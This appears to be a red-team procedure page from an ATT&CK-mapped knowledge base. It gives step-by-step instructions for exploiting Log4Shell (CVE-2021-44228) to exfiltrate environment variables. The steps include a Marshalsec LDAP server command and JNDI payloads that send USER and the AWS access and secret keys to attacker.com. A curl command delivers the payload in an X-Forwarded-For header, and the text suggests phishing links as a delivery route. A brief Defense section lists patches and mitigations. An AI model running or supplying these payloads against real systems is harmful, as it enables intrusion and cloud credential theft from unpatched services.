---
id: 7c9797cd-6bf5-4554-abc4-f2f6aa27e08c
name: Exfiltrate-Environment-Variables-via-Log4Shell
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:56.744371+00:00'
updated_at: '2023-04-06T03:55:56.760193+00:00'
tactics:
  - '[[tactics/Collection|TA0009 - Collection]]'
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Data from Local System|T1005 - Data from Local System]]'
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
  - '[[techniques/Phishing|T1566 - Phishing]]'
sub_techniques:
  - '[[sub-techniques/Spearphishing Link|T1566.002 - Spearphishing Link]]'
tags:
  - '[[tags/CVE-2021-44228 Log4Shell]]'
  - '[[tags/Environment variables exfiltration]]'
  - '[[tags/Exploitation]]'
commands:
  - '[[commands/marshalsec-start-ldap-server]]'
  - '[[commands/curl-send-log4shell-payload]]'
tools:
  - '[[tools/Marshalsec]]'
platforms:
  - Java
  - Linux
  - Windows
validated: true
---

# Exfiltrate-Environment-Variables-via-Log4Shell

## Summary

This procedure exploits the Log4Shell vulnerability (CVE-2021-44228) in Apache Log4j to exfiltrate environment variables from a vulnerable Java application. By crafting a malicious JNDI LDAP payload and sending it to a Log4j-logging endpoint, an attacker can trigger remote code execution that resolves the payload against an attacker-controlled LDAP server, leaking sensitive data like AWS credentials stored in environment variables.

## Description

Log4Shell allows arbitrary code execution via JNDI lookups in log messages. In this technique, the payload uses LDAP to reference environment variables (e.g., ${env:VAR}) which are resolved on the target and sent back to the attacker's server. This is useful for initial access or lateral movement in environments with unpatched Log4j versions (2.0-2.14.1). The target must be a web application or service logging user input. Success provides reconnaissance data for further exploitation, such as cloud credential theft. This procedure assumes the attacker has identified a vulnerable endpoint through reconnaissance.

## Requirements

1. A vulnerable target running Apache Log4j 2.0-beta9 through 2.14.1.
2. Network access to send HTTP requests to the target's logging endpoint (e.g., via browser, curl, or phishing link).
3. An attacker-controlled server to host the LDAP resolver (e.g., using Marshalsec).
4. Knowledge of potential environment variables to target (e.g., AWS_ACCESS_KEY_ID).

## Defense

- Immediately patch Log4j to version 2.17.0 or later.
- Configure Log4j to block JNDI lookups by setting 'log4j2.formatMsgNoLookups' to true or using JVM flags like '-Dlog4j2.formatMsgNoLookups=true'.
- Implement web application firewalls (WAF) to detect and block JNDI payloads in HTTP requests.
- Monitor logs and network traffic for anomalous LDAP resolutions or outbound connections to unexpected domains.

## Objectives

1. Trigger Log4Shell to perform a JNDI LDAP lookup from the target.
2. Exfiltrate specified environment variables to the attacker's server.
3. Obtain sensitive data like cloud credentials for further attacks.

## Instructions

### Step 1: Set Up Attacker-Controlled LDAP Server

**Context**: Start an LDAP server that will receive and log the exfiltrated environment variables from the target. This uses Marshalsec, a tool for simulating malicious LDAP servers in Log4Shell exploits.

**Command** ([[commands/marshalsec-start-ldap-server]]):
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker.com:8080/#" 1389
```

> This command launches the LDAP server on port 1389, configured to reference a dummy HTTP endpoint (replace with your actual exfil server if needed). The server will capture incoming connections and log resolved attributes like environment variables. Expected output includes server startup confirmation and any incoming requests.

### Step 2: Craft the Exfiltration Payload

**Context**: Create the JNDI payload string that references environment variables. This payload will be injected into a log message on the target, causing it to resolve and send the variables via LDAP to your server.

**Code** ([[codes/Log4Shell-LDAP-Exfiltration-Payload]]):

The payload is embedded here for reference:

```text
${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/}

# AWS Access Key
${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}
```

> Customize the domain (attacker.com) and port (1389) to match your LDAP server. The ${env:VAR} syntax pulls environment variables during resolution. Test the payload locally if possible.

### Step 3: Send the Payload to the Vulnerable Endpoint

**Context**: Deliver the payload to the target's Log4j-enabled application, typically via a user-controlled input field like a search box, username field, or HTTP header (e.g., User-Agent). This triggers logging of the payload and initiates the JNDI lookup.

**Command** ([[commands/curl-send-log4shell-payload]]):
```bash
curl -H "X-Forwarded-For: ${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}" http://target.com/vulnerable-endpoint
```

> Replace the header or parameter with your crafted payload and adjust the endpoint URL. If phishing, embed in a link. Expected output is a normal HTTP response from the target, but check your LDAP server logs for exfiltrated data. If successful, you'll see the variables in the LDAP connection logs.
